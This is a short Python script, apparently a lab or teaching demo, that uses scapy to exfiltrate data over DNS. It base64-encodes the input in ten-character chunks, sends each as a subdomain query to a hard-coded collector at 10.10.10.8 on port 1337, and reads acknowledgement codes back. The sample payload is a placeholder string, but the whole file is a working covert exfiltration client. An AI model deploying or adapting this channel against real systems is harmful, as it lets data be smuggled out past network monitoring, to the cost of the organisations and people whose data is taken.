from scapy.all import *
from base64 import b64encode

ip = "10.10.10.8"
domain = "google.com"

def process(response):
    code = str(response[DNS].an.rdata)[-1]
    if int(code) == 1:
        print("Received successfully")
    elif int(code) == 2:
        print("Acknowledged end transmission")
    else:
        print("Transmission error")

def DNSRequest(subdomain):
    global domain
    d = bytes(subdomain + "." + domain,"utf-8")
    query = DNSQR(qname=d)
    mac = get_if_hwaddr(conf.iface)
    p = Ether(src=mac,dst=mac)/IP(dst=bytes(ip,"utf-8"))/UDP(dport=1337)/DNS(qd=query)
    result = srp1(p,verbose=False)
    process(result)


def sendData(data):
    for i in range(0,len(data),10):
        chunk = data[i:min(i+10,len(data))]
        print("Transmitting %s"%chunk)
        encoded = b64encode(bytes(chunk,"utf-8"))
        print(encoded)
        encoded = encoded.decode("utf-8").rstrip("=")
        DNSRequest(encoded)

data = "This is data being exfiltrated over DNS"
sendData(data)
data = "R"
sendData(data)